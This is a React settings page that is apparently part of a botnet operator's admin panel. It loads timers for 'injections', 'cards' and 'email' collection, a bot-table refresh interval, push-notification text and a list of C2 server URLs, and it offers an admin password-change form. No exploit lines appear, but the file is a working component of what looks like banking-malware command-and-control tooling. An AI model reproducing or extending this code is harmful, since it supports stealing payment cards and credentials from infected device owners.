import React from 'react';
import AutoUpdateSelect from '../Controls/Settings/AutoUpdateSelect';
import EditTimesSettings from '../Controls/Settings/EditTimesSettings';
import SettingsContext from '../Settings';

import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import LinksAddForm from '../Controls/Settings/LinksAddForm';
import PushEdit from '../Controls/Settings/PushEdit';
import ProtectEdit from '../Controls/Settings/ProtectEdit';
import { try_eval } from '../serviceF';

function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = name+"="+value+expires+"; path=/";
}

class SettingsPage extends React.Component {

    constructor(props) {
        super(props);
        this.state ={
            LoadHash: '',
            login: '',
            oldpass: '',
            newpass: '',
            newpass2: ''
        };
    }

    componentWillMount() {
        this.LoadSettingsFromServer();
           
    }

    componentWillUpdate () {
    }


    LoadSettingsFromServer() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"settings_main"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
				//	SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
					SettingsContext.arrayUrl = result.URLs;
					SettingsContext.timeInject = result.injections_T;
					SettingsContext.timeCC = result.cards_T;
					SettingsContext.timeMail = result.email_T;
					SettingsContext.pushTitle = result.title_p;
					SettingsContext.pushText = result.text_p;
                    SettingsContext.timeProtect = result.project_T;
                    SettingsContext.admin_T = result.admin_T;
                    SettingsContext.permission_T = result.permission_T;
                 //   SettingsContext.AccessKey = result.hash;
					if(result.updateTableBots == 0) {
						SettingsContext.autoUpdateDelay = 0;
						SettingsContext.autoUpdateEnable = false;
					}
					else {
						SettingsContext.autoUpdateDelay = result.updateTableBots;
						SettingsContext.autoUpdateEnable = true;
					}
					SettingsContext.SaveSettingsCookies();
					this.setState({
						LoadHash: Math.random().toString()
					});
				}
				
            }
            catch (ErrMgs) {}
        }.bind(this));
    }

    change_pass() {
        let request = $.ajax({
            type: 'POST',
            url: '/change/',
            data: {
                'r1': new Buffer('{"login":"'+this.state.login+'","oldpass":"'+this.state.oldpass+'","newpass":"'+this.state.newpass+'","newpass2":"'+this.state.newpass2+'"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				if(msg == 'ok'){
                    try_eval('$.notify("The password is changed", "info");'); 
                }else{
                    try_eval('$.notify("Error, check the entered data", "info");'); 
                }
               
				
            }
            catch (ErrMgs) {}
        }.bind(this));
    }


    login(event) {
        this.setState({login: event.target.value});
    }
    oldpass(event) {
        this.setState({oldpass: event.target.value});
    }
    newpass(event) {
        this.setState({newpass: event.target.value});
    }
    newpass2(event) {
        this.setState({newpass2: event.target.value});
    }

   
    render () {
        return (
            
            <div>
             <center>
                        <h2 class="disable-select">Settings</h2>

                    <div class="col-7">
                        <div class="settings mb-3">
                            
                            {/* <div class="card-body text-dark">
                            <h5 class="card-title">AccessKey</h5>
                           <b> <samp class="dark">{SettingsContext.AccessKey}</samp></b>
                            </div> */}

                            <div class="card-body text-dark">
                            <h5 class="card-title">List URL connect to server</h5>
                            <LinksAddForm updateHash={this.state.LoadHash}/>
                            </div>

                            <div class="card-body text-dark">
                            <AutoUpdateSelect updateHash={this.state.LoadHash}/>
                            </div>

                            
                            <div class="card-body text-dark">
                            <ProtectEdit updateHash={this.state.LoadHash} />
                            </div>

                            <div class="card-body text-dark">
                            <EditTimesSettings updateHash={this.state.LoadHash}/>
                            </div>

                            <div class="card-body text-dark">
                            <h5 class="card-title">Data for auto push notifications</h5>
                            <PushEdit updateHash={this.state.LoadHash}/>
                            </div>

                        

                            <hr/><hr/>

                            <div class="card-body text-dark">

                            <h5 class="card-title">Change your admin panel password</h5>
                            <input id="login"  onChange={this.login.bind(this)} placeholder="Login" class="form-control" type="text" style={({marginBottom: '15px'})}/>
                            <input id="old_pass" onChange={this.oldpass.bind(this)} placeholder="Old password" class="form-control" type="password" style={({marginBottom: '15px'})}/>
                            <input id="new_pass" onChange={this.newpass.bind(this)} placeholder="New password" class="form-control" type="password" style={({marginBottom: '15px'})}/>
                            <input id="new_pass2" onChange={this.newpass2.bind(this)} placeholder="Repeat the new password" class="form-control" type="password" style={({marginBottom: '15px'})}/>
                            <button type="button" class="btn btn-outline-primary" onClick={this.change_pass.bind(this)} style={({float:'center', width: '120px'})}>Change</button>
     
                            </div>

                        </div>
                    </div>
                    </center>
            </div>
        );
    }
}

export default SettingsPage;